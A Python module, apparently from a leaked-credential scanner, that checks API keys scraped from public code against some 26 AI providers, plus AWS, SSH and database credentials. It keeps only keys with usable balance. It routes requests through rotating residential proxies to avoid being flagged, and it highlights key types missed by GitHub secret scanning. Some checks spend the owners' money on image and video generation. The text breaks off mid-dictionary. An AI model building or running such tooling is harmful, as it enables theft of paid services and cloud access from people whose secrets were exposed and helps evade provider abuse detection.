"""
Live validation of found keys against provider APIs.
Returns True if key is confirmed active (not revoked).

All validation requests go through Evomi residential proxy if EVOMI_PROXY is set.
This prevents Railway's datacenter IP from being flagged by provider APIs
after repeated validation attempts.

Set on Railway:
  EVOMI_PROXY=http://user:password@rp.evomi.com:1000
  (country-rotate automatically — no extra config needed)
"""

import asyncio
import os
import re
import random
import logging
import urllib.parse

import httpx

from config import OPENAI_VALIDATION_MODEL

log = logging.getLogger(__name__)

_TIMEOUT = httpx.Timeout(15.0)

# Evomi residential proxy pool — validation calls only, not GitHub API.
# Format: comma-separated list for redundancy/load distribution.
#   EVOMI_PROXY=http://user:pass@rp.evomi.com:1000
#   EVOMI_PROXY=http://user:pass@rp.evomi.com:1000,http://user:pass@rp.evomi.com:1001
#
# Evomi rotates the exit IP on every request by default (rotating residential).
# For country targeting: http://user-country-US:pass@rp.evomi.com:1000
# Estimated traffic: ~5KB/validation × 500 validations/day ≈ 2.5MB/day ≈ $0.001/day
_PROXY_URLS: list[str] = [
    u.strip()
    for u in os.environ.get("EVOMI_PROXY", "").split(",")
    if u.strip()
]


def _client(**kwargs) -> httpx.AsyncClient:
    """Return an AsyncClient optionally routed through a random Evomi proxy."""
    if _PROXY_URLS:
        proxy = random.choice(_PROXY_URLS)
        return httpx.AsyncClient(timeout=_TIMEOUT, proxy=proxy, **kwargs)
    return httpx.AsyncClient(timeout=_TIMEOUT, **kwargs)


# ── Quota-aware AI provider validators ─────────────────────────────────────
# A key is "valid" only if it can actually run inference. /models endpoints
# return 200 even for keys with $0 balance, leaked-then-blocked keys, and
# keys whose project never enabled the API. We do a 1-token completion (or
# a balance lookup where the provider exposes one) and parse the error body
# for known dead-key signatures.
#
# Cost per check: ~$0.0000007 (gpt-4o-mini, 1+1 tokens) — negligible since
# validation runs ONCE per new key (key_exists() gate in scanner).

def _err_field(body: dict, *path: str) -> str:
    cur = body
    for p in path:
        if not isinstance(cur, dict):
            return ""
        cur = cur.get(p, "")
    return str(cur or "")


async def validate_openai(key: str) -> bool:
    """
    True only if key works AND has usable quota.
    Detects: insufficient_quota (429 + error.code), revoked (401), org-disabled (403).
    """
    try:
        async with _client() as c:
            r = await c.post(
                "https://api.openai.com/v1/chat/completions",
                headers={"Authorization": f"Bearer {key}"},
                json={
                    "model":      OPENAI_VALIDATION_MODEL,
                    "messages":   [{"role": "user", "content": "hi"}],
                    "max_tokens": 1,
                },
            )
            if r.status_code == 200:
                return True
            if r.status_code in (401, 403):
                return False
            try:
                body = r.json()
            except Exception:
                body = {}
            code  = _err_field(body, "error", "code")
            etype = _err_field(body, "error", "type")
            if code == "insufficient_quota" or etype == "insufficient_quota":
                return False
            if code in ("invalid_api_key", "account_deactivated"):
                return False
            # Real rate-limit / transient server errors — key works
            return r.status_code in (429, 500, 502, 503, 504)
    except Exception as e:
        log.debug("openai validate err: %s", e)
        return False


async def validate_openai_image(key: str) -> bool:
    """
    True only if key has gpt-image-2 access (org verification + image quota).
    Uses /v1/images/generations with n=1 size=1024x1024 — cheapest real probe.
    gpt-image-2 requires org verification; keys without it get 403 billing_not_active
    or 400 model_not_found even with valid chat quota — so chat validator is not enough.

    Cost: ~$0.04/validation (1 standard 1024x1024 image). Only runs for keys found
    specifically in gpt-image-2 context (provider="openai_image").
    """
    try:
        async with _client() as c:
            r = await c.post(
                "https://api.openai.com/v1/images/generations",
                headers={"Authorization": f"Bearer {key}"},
                json={
                    "model":   "gpt-image-2",
                    "prompt":  "a red circle",
                    "n":       1,
                    "size":    "1024x1024",
                    "quality": "low",
                },
            )
            if r.status_code == 200:
                return True
            if r.status_code in (401, 403):
                return False
            try:
                body = r.json()
            except Exception:
                body = {}
            code = _err_field(body, "error", "code")
            msg  = _err_field(body, "error", "message").lower()
            if code in ("insufficient_quota", "invalid_api_key", "account_deactivated"):
                return False
            if "billing" in msg or "organization" in msg or "verif" in msg:
                return False
            if "model_not_found" in msg or "model not found" in msg:
                return False
            return r.status_code in (429, 500, 502, 503, 504)
    except Exception as e:
        log.debug("openai_image validate err: %s", e)
        return False


async def validate_anthropic(key: str) -> bool:
    """
    True only if key works AND has credit balance.
    Detects: 'credit balance is too low' (400), invalid key (401).
    """
    try:
        async with _client() as c:
            r = await c.post(
                "https://api.anthropic.com/v1/messages",
                headers={
                    "x-api-key":         key,
                    "anthropic-version": "2023-06-01",
                },
                json={
                    "model":      "claude-haiku-4-5-20251001",
                    "max_tokens": 1,
                    "messages":   [{"role": "user", "content": "hi"}],
                },
            )
            if r.status_code == 200:
                return True
            if r.status_code in (401, 403):
                return False
            try:
                body = r.json()
            except Exception:
                body = {}
            etype = _err_field(body, "error", "type")
            msg   = _err_field(body, "error", "message").lower()
            # Zero-balance / no-billing — official error type + fallback text match
            if etype == "credit_balance_too_low":
                return False
            if "credit balance" in msg or "insufficient" in msg or "billing" in msg:
                return False
            # Invalid key structure
            if r.status_code == 400 and "invalid" in msg and "api" in msg:
                return False
            # Overloaded is transient — key itself is fine
            if etype == "overloaded_error":
                return True
            return r.status_code in (429, 500, 502, 503, 504)
    except Exception as e:
        log.debug("anthropic validate err: %s", e)
        return False


async def validate_google(key: str) -> bool:
    """
    True only if key can run generation.
    Detects:
      - 'API key was reported as leaked' (Google Secret Scanning auto-block)
      - 'Generative Language API has not been used' (project never enabled the API)
      - INVALID_ARGUMENT / PERMISSION_DENIED / RESOURCE_EXHAUSTED
    """
    if key.startswith("sa:"):
        return False  # service-account JSON requires OAuth, not API-key flow
    try:
        async with _client() as c:
            r = await c.post(
                "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-lite:generateContent",
                params={"key": key},
                json={
                    "contents":         [{"parts": [{"text": "hi"}]}],
                    "generationConfig": {"maxOutputTokens": 1},
                },
            )
            if r.status_code == 200:
                return True
            try:
                body = r.json()
            except Exception:
                body = {}
            status = _err_field(body, "error", "status")
            msg    = _err_field(body, "error", "message").lower()
            if "reported as leaked" in msg:
                return False
            if "has not been used" in msg or "is disabled" in msg:
                return False
            if "api key not valid" in msg or "api_key_invalid" in msg:
                return False
            if status in ("RESOURCE_EXHAUSTED", "PERMISSION_DENIED",
                          "INVALID_ARGUMENT", "UNAUTHENTICATED", "FAILED_PRECONDITION"):
                return False
            return r.status_code in (429, 500, 502, 503, 504)
    except Exception as e:
        log.debug("google validate err: %s", e)
        return False


async def validate_deepseek(key: str) -> bool:
    """
    True only if key works AND total_balance > 0.
    Uses /user/balance endpoint — no completion spend, exact balance read.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.deepseek.com/user/balance",
                headers={"Authorization": f"Bearer {key}"},
            )
            if r.status_code != 200:
                return False
            body = r.json()
            if not body.get("is_available", False):
                return False
            for b in body.get("balance_infos", []):
                try:
                    if float(b.get("total_balance", "0")) > 0:
                        return True
                except (TypeError, ValueError):
                    continue
            return False
    except Exception as e:
        log.debug("deepseek validate err: %s", e)
        return False


async def validate_elevenlabs(key: str) -> bool:
    """
    True only if key works AND character quota not exhausted.
    /v1/user returns subscription.{character_count, character_limit}.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.elevenlabs.io/v1/user",
                headers={"xi-api-key": key},
            )
            if r.status_code != 200:
                return False
            sub   = (r.json() or {}).get("subscription", {}) or {}
            tier  = (sub.get("tier") or "").lower()
            if tier == "free":
                return False  # free plan — not useful for generation pipeline
            used  = sub.get("character_count", 0) or 0
            limit = sub.get("character_limit", 0) or 0
            # limit=0 or unlimited tier → has quota; otherwise must have headroom
            if limit <= 0:
                return True
            return used < limit
    except Exception as e:
        log.debug("elevenlabs validate err: %s", e)
        return False


# ARK / Volcengine probe regions. Try CN mainland first (most accounts),
# fall back to international endpoint for Volcengine Global keys.
_ARK_REGIONS = [
    "https://ark.cn-beijing.volces.com",
    "https://ark.ap-southeast.volces.com",
]

# Seedance video models — probe order: cheapest first to minimize cost
# if validation accidentally creates a task (we cancel best-effort below).
_ARK_SEEDANCE_MODELS = [
    # Seedance 2.0 — probe first (newer, more widely accessible Apr 2026+)
    "doubao-seedance-2-0-fast-260128",       # 2.0 fast (cheapest probe)
    "doubao-seedance-2-0-260128",            # 2.0 standard
    # Seedance 1.0 — fallback for keys that predate 2.0 rollout
    "doubao-seedance-1-0-lite-i2v-250428",   # 1.0 i2v lite
    "doubao-seedance-1-0-lite-t2v-250428",   # 1.0 t2v lite
    "doubao-seedance-1-0-pro-250528",        # 1.0 pro
]

# Cheap Doubao chat model for the auth pre-check — distinguishes
# "dead key" from "alive key but no Seedance access".
_ARK_DOUBAO_CHAT = "doubao-1-5-lite-32k-250115"


def _ark_err_code(body: dict) -> str:
    """Volcengine returns either {error: {code, message}} or top-level Code/Message."""
    if not isinstance(body, dict):
        return ""
    err = body.get("error")
    if isinstance(err, dict):
        return err.get("code", "") or ""
    return body.get("Code", "") or body.get("code", "") or ""


async def _ark_post(url: str, key: str, payload: dict) -> tuple[int, dict]:
    host = urllib.parse.urlparse(url).hostname or ""
    try:
        async with _client() as c:
            r = await c.post(
                url,
                headers={"Authorization": f"Bearer {key}", "Host": host},
                json=payload,
            )
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, {}
    except Exception as e:
        log.debug("ark post err (%s): %s", url, e)
        return 0, {}


async def _ark_cancel_task(region: str, key: str, task_id: str):
    """Best-effort cancel — bounds cost if validation accidentally created a task."""
    try:
        async with _client() as c:
            await c.delete(
                f"{region}/api/v3/contents/generations/tasks/{task_id}",
                headers={"Authorization": f"Bearer {key}"},
            )
    except Exception:
        pass


# Billing error codes that mean the account CAN authenticate but CANNOT generate.
# Defined at module level so both ark/ark_fast validators can reference it.
_ARK_BILLING_DEAD = frozenset({
    "AccountOverdueError", "InsufficientBalance", "AccountBalanceNotEnough",
    "ChargeNotEnoughError", "ResourceInsufficient",
})

_ARK_MODEL_DEAD = frozenset({"ModelNotOpen", "InvalidEndpointOrModel.NotFound", "EndpointNotFound"})


async def _ark_auth_check(region: str, key: str) -> str:
    """
    Step 1 for both ark validators: cheap Doubao chat auth pre-check.
    Returns: 'dead' | 'billing_dead' | 'ok' | 'unreachable'
    """
    status, body = await _ark_post(f"{region}/api/v3/chat/completions", key, {
        "model":      _ARK_DOUBAO_CHAT,
        "messages":   [{"role": "user", "content": "hi"}],
        "max_tokens": 1,
    })
    if status == 0:
        return "unreachable"
    code = _ark_err_code(body)
    if status == 401 or code in ("AuthenticationFailed", "InvalidApiKey", "Unauthorized"):
        return "dead"
    if code in _ARK_BILLING_DEAD:
        return "billing_dead"
    return "ok"


async def validate_ark_fast(key: str) -> bool:
    """
    True only if ARK key can access Seedance 2.0-fast model
    (doubao-seedance-2-0-fast-260128). Keys with only 2.0-standard or 1.x → False.
    Registered BEFORE validate_ark in VALIDATORS so that dual-capable keys
    are saved as ark_fast (higher priority) — hash uniqueness prevents dupe saves.
    """
    for region in _ARK_REGIONS:
        auth = await _ark_auth_check(region, key)
        if auth == "unreachable":
            continue
        if auth in ("dead", "billing_dead"):
            return False
        s, b = await _ark_post(f"{region}/api/v3/contents/generations/tasks", key, {
            "model":   "doubao-seedance-2-0-fast-260128",
            "content": [],
        })
        if s == 200:
            task_id = (b.get("id") or "").strip()
            if task_id:
                await _ark_cancel_task(region, key, task_id)
            return True
        if s == 429:
            return True
        c = _ark_err_code(b)
        if c in _ARK_MODEL_DEAD:
            return False  # 2.0-fast not activated on this account
        if 400 <= s < 500:
            return True   # param-level error = model activated
        return False
    return False


async def validate_ark(key: str) -> bool:
    """
    True only if ARK key can access Seedance 2.0-standard model
    (doubao-seedance-2-0-260128). Keys with only 1.x → False.
    Note: 2.0-fast keys are captured by validate_ark_fast (runs first);
    this handles keys that have 2.0-standard but not 2.0-fast.
    """
    for region in _ARK_REGIONS:
        auth = await _ark_auth_check(region, key)
        if auth == "unreachable":
            continue
        if auth in ("dead", "billing_dead"):
            return False
        s, b = await _ark_post(f"{region}/api/v3/contents/generations/tasks", key, {
            "model":   "doubao-seedance-2-0-260128",
            "content": [],
        })
        if s == 200:
            task_id = (b.get("id") or "").strip()
            if task_id:
                await _ark_cancel_task(region, key, task_id)
            return True
        if s == 429:
            return True
        c = _ark_err_code(b)
        if c in _ARK_MODEL_DEAD:
            return False  # 2.0-standard not activated
        if 400 <= s < 500:
            return True
        return False
    return False


_HH_VIDEO_KEYWORDS = re.compile(
    r'(?:video|i2v|t2v|image.to.video|text.to.video|img2vid|txt2vid|wan|animate)',
    re.IGNORECASE,
)


async def validate_happyhorse(key: str) -> bool:
    """
    True only if key authenticates AND the account has at least one video
    generation model available. 403 = bad key (not just permission — HH uses
    403 for auth failures too). 429 = rate-limited but valid.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.runhappyhorse.net/v1/models",
                headers={"Authorization": f"Bearer {key}"},
            )
        if r.status_code == 429:
            return True  # rate-limited but authenticated
        if r.status_code != 200:
            return False  # 401/403/other → dead or no access
        # Parse model list: require at least one video-capable model
        try:
            models = r.json()
            if isinstance(models, dict):
                models = models.get("data", models.get("models", []))
            if not isinstance(models, list) or not models:
                return True  # 200 but unparseable list → key is live
            ids = " ".join(
                (m.get("id", "") if isinstance(m, dict) else str(m))
                for m in models
            )
            return bool(_HH_VIDEO_KEYWORDS.search(ids))
        except Exception:
            return True  # 200 but non-JSON → treat as valid
    except Exception as e:
        log.debug("happyhorse validate err: %s", e)
        return False


async def validate_replicate(key: str) -> bool:
    """
    Replicate — GET /v1/account: 200 = live key, 401 = dead.
    Keys use 'Authorization: Token r8_...' header (not Bearer).
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.replicate.com/v1/account",
                headers={"Authorization": f"Token {key}"},
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        return r.status_code == 429
    except Exception as e:
        log.debug("replicate validate err: %s", e)
        return False


async def validate_fal(key: str) -> bool:
    """
    Fal.ai — GET /v1/account/info: 200 = live, 401/403 = dead.
    Keys use 'Authorization: Key <fal_key>' header.
    Key format: 'key_id:key_secret' (hex) stored as FAL_KEY env var.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.fal.ai/v1/account/info",
                headers={"Authorization": f"Key {key}"},
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        # Also try as Bearer token (some wrappers use it)
        if r.status_code == 404:
            async with _client() as c2:
                r2 = await c2.get(
                    "https://fal.ai/api/billing/balance",
                    headers={"Authorization": f"Key {key}"},
                )
            return r2.status_code == 200
        return r.status_code == 429
    except Exception as e:
        log.debug("fal validate err: %s", e)
        return False


async def validate_grok(key: str) -> bool:
    """
    xAI Grok — GET /v1/models: 200 = live key, 401 = dead.
    xAI gives $25 free credit monthly so most non-revoked keys have quota.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.x.ai/v1/models",
                headers={"Authorization": f"Bearer {key}"},
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        return r.status_code == 429
    except Exception as e:
        log.debug("grok validate err: %s", e)
        return False


async def validate_suno(key: str) -> bool:
    """
    Suno AI music generation — GET /api/get_limit checks credits.
    Uses the community API wrapper at api.sunoapi.org (mirrors official Suno API).
    401 = invalid key, 200 with credits_left=0 = exhausted, otherwise valid.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.sunoapi.org/api/get_limit",
                headers={"Authorization": f"Bearer {key}"},
            )
        if r.status_code == 401:
            return False
        if r.status_code == 429:
            return True
        if r.status_code == 200:
            try:
                body = r.json() or {}
                credits = body.get("credits_left", body.get("remaining", -1))
                if credits == 0:
                    return False
            except Exception:
                pass
            return True
        return False
    except Exception as e:
        log.debug("suno validate err: %s", e)
        return False


async def validate_inworld(key: str) -> bool:
    """
    Inworld AI TTS — the key is a base64-encoded 'api_key:api_secret' pair.
    Extractor stores the pre-encoded base64 string found near INWORLD_BASE64 /
    INWORLD_AUTH context; validator just checks Basic auth against the studio API.
    """
    try:
        import base64
        # Validate it decodes to something that looks like key:secret
        try:
            decoded = base64.b64decode(key + "==").decode("utf-8", errors="replace")
            if ":" not in decoded:
                return False
        except Exception:
            return False
        async with _client() as c:
            r = await c.get(
                "https://api.inworld.ai/v1/workspaces",
                headers={"Authorization": f"Basic {key}"},
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        return r.status_code == 429
    except Exception as e:
        log.debug("inworld validate err: %s", e)
        return False


async def validate_kimi(key: str) -> bool:
    """
    Kimi / Moonshot AI — POST /v1/chat/completions with kimi-k2.6 probe.
    Key is valid only if it can reach kimi-k2.6 AND has active balance.

    Known error types:
      exceeded_current_quota_error — account suspended (no balance) → False
    CN endpoint tried first, falls back to international (.ai).
    """
    payload = {
        "model":      "kimi-k2.6",
        "messages":   [{"role": "user", "content": "hi"}],
        "max_tokens": 1,
    }
    for base in ("https://api.moonshot.cn", "https://api.moonshot.ai"):
        try:
            async with _client() as c:
                r = await c.post(
                    f"{base}/v1/chat/completions",
                    headers={"Authorization": f"Bearer {key}"},
                    json=payload,
                )
            if r.status_code == 200:
                return True
            if r.status_code == 429:
                return True   # rate-limited = alive
            if r.status_code in (401, 403):
                return False
            try:
                body = r.json()
            except Exception:
                body = {}
            etype = _err_field(body, "error", "type")
            msg   = _err_field(body, "error", "message").lower()
            # No balance / suspended account
            if etype == "exceeded_current_quota_error":
                return False
            if "insufficient balance" in msg or "suspended" in msg:
                return False
            # kimi-k2.6 not available on this account
            if "model" in msg and any(kw in msg for kw in
                                      ("not found", "not exist", "no permission",
                                       "not support", "invalid")):
                return False
            # Other 4xx with parseable body = key alive but params wrong
            if 400 <= r.status_code < 500:
                return True
        except Exception:
            continue
    return False


async def validate_glm(key: str) -> bool:
    """
    Zhipu AI / ChatGLM — POST /chat/completions probe with glm-5.1.
    Key is valid only if it can reach glm-5.1 AND has active balance.

    Known error codes:
      1113 — 余额不足/no resource pack (balance dead) → False
      1301 — rate limited (key is alive) → True
    If glm-5.1 returns model-not-found or no-access → False (not useful to us).
    """
    try:
        async with _client() as c:
            r = await c.post(
                "https://open.bigmodel.cn/api/paas/v4/chat/completions",
                headers={"Authorization": f"Bearer {key}"},
                json={
                    "model":      "glm-5.1",
                    "messages":   [{"role": "user", "content": "hi"}],
                    "max_tokens": 1,
                },
            )
        if r.status_code == 429:
            return True   # rate-limited but key is alive
        if r.status_code in (401, 403):
            return False
        try:
            body = r.json()
        except Exception:
            body = {}
        code = str(_err_field(body, "error", "code"))
        msg  = _err_field(body, "error", "message").lower()
        # No balance / no resource pack (can arrive as 200 or 4xx)
        if code == "1113":
            return False
        # Rate-limited via error code (some versions return 200+1301)
        if code == "1301":
            return True
        # glm-5.1 not available / not enabled on this account
        if any(kw in msg for kw in ("not found", "not exist", "no permission",
                                     "找不到", "不存在", "没有权限", "model")):
            return False
        if r.status_code == 200:
            return True
        # Any other 4xx with a parseable error but not auth failure = key alive
        if 400 <= r.status_code < 500:
            return True
        return False
    except Exception as e:
        log.debug("glm validate err: %s", e)
        return False


async def validate_kling(key: str) -> bool:
    """
    KLING / Kuaishou — keys stored as 'access_key:secret_key' pair.
    Auth model: generate short-lived JWT (HS256, iss=access_key) then call API.
    Only kling-v3 Pro/Standard with active balance qualifies as valid.

    Kling check order: auth → balance → task creation.
    Known codes:
      1002 — Auth failed (wrong JWT signature or invalid key pair) → False
      1102 — Account balance not enough (auth passed, no credits) → False
      200  — task created (kling-v3 Standard 5s probe) → True
      429  — rate limited (key alive) → True
    """
    if ":" not in key:
        return False
    access_key, secret_key = key.split(":", 1)
    if not access_key or not secret_key:
        return False
    try:
        import time
        import jwt as _jwt
        now = int(time.time())
        token = _jwt.encode(
            {"iss": access_key, "exp": now + 1800, "nbf": now - 5},
            secret_key,
            algorithm="HS256",
            headers={"alg": "HS256", "typ": "JWT"},
        )
        # Probe: POST kling-v3 Standard (cheapest tier, 5s).
        # Kling checks auth then balance before creating task so:
        #   bad key  → 1002, no balance → 1102, both ok → 200 (task created)
        async with _client() as c:
            r = await c.post(
                "https://api.klingai.com/v1/videos/text2video",
                headers={
                    "Authorization": f"Bearer {token}",
                    "Content-Type":  "application/json",
                },
                json={
                    "model_name":   "kling-v3",
                    "mode":         "standard",
                    "prompt":       "test",
                    "duration":     "5",
                    "aspect_ratio": "16:9",
                },
            )
        if r.status_code == 429:
            return True
        try:
            body = r.json()
        except Exception:
            body = {}
        code = int(body.get("code", -1))
        if code == 1002:
            return False   # auth failed
        if code == 1102:
            return False   # no balance
        # task created successfully (code=0 or code missing, HTTP 200)
        if r.status_code == 200:
            return True
        # any non-auth, non-balance error = key alive with balance
        if code not in (1002, 1102) and code != -1:
            return True
        if r.status_code in (401, 403):
            return False
        return False
    except Exception as e:
        log.debug("kling validate err: %s", e)
        return False


async def validate_huggingface(key: str) -> bool:
    """
    HuggingFace — GET /api/whoami-v2: live token check.
    HF can return HTTP 200 with {"error": "Invalid username or password."} for
    revoked/invalid tokens (not always a 401), so we parse the body too.
    hf_ tokens with any scope (read/write/inference) are usable.
    """
    if key.startswith("hf_ctx:"):
        key = key[7:]
    try:
        async with _client() as c:
            r = await c.get(
                "https://huggingface.co/api/whoami-v2",
                headers={"Authorization": f"Bearer {key}"},
            )
        if r.status_code == 429:
            return True
        if r.status_code in (401, 403):
            return False
        if r.status_code == 200:
            try:
                body = r.json()
                # HF sometimes returns 200 + error body for revoked tokens
                if "error" in body:
                    return False
            except Exception:
                pass
            return True
        return False
    except Exception as e:
        log.debug("huggingface validate err: %s", e)
        return False


async def validate_together(key: str) -> bool:
    """
    Together AI — GET /v1/models: 200 = live key, 401 = dead.
    Free tier has credits, so most non-revoked keys are active.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.together.xyz/v1/models",
                headers={"Authorization": f"Bearer {key}"},
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        return r.status_code == 429
    except Exception as e:
        log.debug("together validate err: %s", e)
        return False


async def validate_perplexity(key: str) -> bool:
    """
    Perplexity AI — cheap 1-token sonar completion probe.
    pplx- keys: 401 = invalid, 402 = no credits, 200/429 = active.
    """
    try:
        async with _client() as c:
            r = await c.post(
                "https://api.perplexity.ai/chat/completions",
                headers={"Authorization": f"Bearer {key}"},
                json={
                    "model":      "sonar",
                    "messages":   [{"role": "user", "content": "hi"}],
                    "max_tokens": 1,
                },
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        if r.status_code == 402:
            return False  # no credits
        try:
            body = r.json()
            msg = _err_field(body, "error", "message").lower()
            if "invalid" in msg and "key" in msg:
                return False
        except Exception:
            pass
        return r.status_code in (429, 500, 502, 503)
    except Exception as e:
        log.debug("perplexity validate err: %s", e)
        return False


async def validate_runway(key: str) -> bool:
    """
    Runway ML Gen-3 — GET /v1/organizations: 200 = live key.
    API requires X-Runway-Version header (date string).
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.dev.runwayml.com/v1/organizations",
                headers={
                    "Authorization":   f"Bearer {key}",
                    "X-Runway-Version": "2024-11-06",
                },
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        return r.status_code == 429
    except Exception as e:
        log.debug("runway validate err: %s", e)
        return False


async def validate_groq(key: str) -> bool:
    """
    Groq — GET /openai/v1/models: 200 = live key, 401 = dead.
    gsk_ prefix, NOT in GitHub secret scanning → high validity rate.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.groq.com/openai/v1/models",
                headers={"Authorization": f"Bearer {key}"},
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        return r.status_code == 429
    except Exception as e:
        log.debug("groq validate err: %s", e)
        return False


async def validate_fireworks(key: str) -> bool:
    """
    Fireworks AI — GET /inference/v1/models: 200 = live, 401 = dead.
    fw_ prefix, NOT in GitHub secret scanning.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.fireworks.ai/inference/v1/models",
                headers={"Authorization": f"Bearer {key}"},
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        return r.status_code == 429
    except Exception as e:
        log.debug("fireworks validate err: %s", e)
        return False


async def validate_openrouter(key: str) -> bool:
    """
    OpenRouter — GET /api/v1/auth/key.

    Key signals:
      is_free_tier=true  → never purchased credits → 402 on paid models → False
      limit != null AND usage >= limit → spending limit exhausted → False
      otherwise (paid account, within/no limit) → True

    NOTE: limit=null means "no spending limit set", NOT unlimited credits.
    The real paid-vs-free signal is is_free_tier.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://openrouter.ai/api/v1/auth/key",
                headers={"Authorization": f"Bearer {key}"},
            )
        if r.status_code in (401, 403):
            return False
        if r.status_code == 429:
            return True
        if r.status_code == 200:
            try:
                data = r.json().get("data") or {}
                if data.get("is_free_tier") is True:
                    return False
                limit = data.get("limit")
                if limit is not None:
                    usage = float(data.get("usage", 0) or 0)
                    if float(limit) <= usage:
                        return False
            except Exception:
                pass
            return True
        return False
    except Exception as e:
        log.debug("openrouter validate err: %s", e)
        return False


async def validate_mistral(key: str) -> bool:
    """
    Mistral AI — GET /v1/models: 200 = live, 401 = dead.
    NOT in GitHub secret scanning.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.mistral.ai/v1/models",
                headers={"Authorization": f"Bearer {key}"},
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        return r.status_code == 429
    except Exception as e:
        log.debug("mistral validate err: %s", e)
        return False


async def validate_cohere(key: str) -> bool:
    """
    Cohere — GET /v2/models: 200 = live, 401 = dead.
    NOT in GitHub secret scanning.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.cohere.com/v2/models",
                headers={"Authorization": f"bearer {key}"},
            )
        if r.status_code == 200:
            return True
        if r.status_code in (401, 403):
            return False
        return r.status_code == 429
    except Exception as e:
        log.debug("cohere validate err: %s", e)
        return False


VALIDATORS: dict[str, callable] = {
    "openai":       validate_openai,
    "openai_image": validate_openai_image,
    "anthropic":    validate_anthropic,
    "google":       validate_google,
    "deepseek":     validate_deepseek,
    "elevenlabs":   validate_elevenlabs,
    "ark":          validate_ark,         # Seedance 2.0-standard — higher value, first
    "ark_fast":     validate_ark_fast,   # Seedance 2.0-fast
    "happyhorse":   validate_happyhorse,
    "grok":         validate_grok,
    "suno":         validate_suno,
    "inworld":      validate_inworld,
    "replicate":    validate_replicate,
    "fal":          validate_fal,
    "huggingface":  validate_huggingface,
    "together":     validate_together,
    "perplexity":   validate_perplexity,
    "runway":       validate_runway,
    "kimi":         validate_kimi,
    "glm":          validate_glm,
    "kling":        validate_kling,
    "groq":         validate_groq,
    "fireworks":    validate_fireworks,
    "openrouter":   validate_openrouter,
    "mistral":      validate_mistral,
    "cohere":       validate_cohere,
}


async def validate(provider: str, key: str) -> bool:
    fn = VALIDATORS.get(provider)
    if fn is None:
        return False
    return await fn(key)


# ── Infrastructure credential validators ───────────────────────────────────────

_DB_PORTS = {
    "postgres": 5432, "postgresql": 5432,
    "mysql": 3306, "mariadb": 3306,
    "mongodb": 27017, "mongodb+srv": 27017,
    "redis": 6379, "rediss": 6380,
    "mssql": 1433, "sqlserver": 1433,
    "clickhouse": 9000, "cassandra": 9042,
    "elasticsearch": 9200, "neo4j": 7474,
}


async def validate_database(cred: str) -> bool:
    """TCP connect to host:port extracted from DSN. Confirms host is reachable."""
    try:
        p = urllib.parse.urlparse(cred)
        host = p.hostname
        if not host or host in ("localhost", "127.0.0.1", "::1"):
            return False
        port = p.port or _DB_PORTS.get((p.scheme or "").lower(), 5432)
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=6.0
        )
        writer.close()
        await writer.wait_closed()
        return True
    except Exception:
        return False


try:
    import boto3 as _boto3
    from botocore.exceptions import ClientError as _ClientError
    _BOTO3_OK = True
except ImportError:
    _BOTO3_OK = False
    log.warning("boto3 not installed — AWS key validation disabled. Add boto3 to requirements.txt")

try:
    from cryptography.hazmat.primitives.serialization import load_pem_private_key as _load_pem
    _CRYPTO_OK = True
except ImportError:
    _CRYPTO_OK = False
    log.warning("cryptography not installed — SSH key structural validation disabled.")


async def validate_aws(cred: str) -> bool:
    """
    Call STS GetCallerIdentity with extracted AKID+secret.
    Valid = 200 (works) OR SignatureDoesNotMatch / AccessDenied (key exists, wrong secret or permissions).
    Invalid = InvalidClientTokenId (key doesn't exist at all).
    """
    if not _BOTO3_OK:
        return False
    try:
        kid, rest = cred.split(":", 1)
        secret, _ = rest.rsplit("@", 1)
        if "secret_unknown" in secret or len(secret) < 20:
            return False

        def _sts_check():
            try:
                client = _boto3.client(
                    "sts",
                    aws_access_key_id=kid,
                    aws_secret_access_key=secret,
                    region_name="us-east-1",
                )
                client.get_caller_identity()
                return True  # fully valid
            except _ClientError as exc:
                code = exc.response.get("Error", {}).get("Code", "")
                # Key ID exists but secret/perms wrong → key is real
                return code in ("SignatureDoesNotMatch", "AccessDenied",
                                "ExpiredTokenException", "TokenRefreshRequired")
            except Exception:
                return False

        return await asyncio.to_thread(_sts_check)
    except Exception as e:
        log.debug("aws validate err: %s", e)
        return False


async def validate_ssh(cred: str) -> bool:
    """Parse PEM key structure. Valid = parses without error."""
    if not _CRYPTO_OK:
        return False
    if "BEGIN" not in cred or "PRIVATE KEY" not in cred:
        return False
    try:
        await asyncio.to_thread(_load_pem, cred.encode(), None)
        return True
    except Exception:
        return False


async def validate_alibaba(cred: str) -> bool:
    return False  # requires Alibaba SDK + STS; skip for now


async def validate_azure(cred: str) -> bool:
    return False  # requires Azure SDK; skip for now


async def validate_infra_token(cred: str) -> bool:
    return False  # deploy tokens require per-service API call; skip for now


INFRA_VALIDATORS: dict[str, callable] = {
    "database": validate_database,
    "ssh":      validate_ssh,
    "aws":      validate_aws,
    "alibaba":  validate_alibaba,
    "azure":    validate_azure,
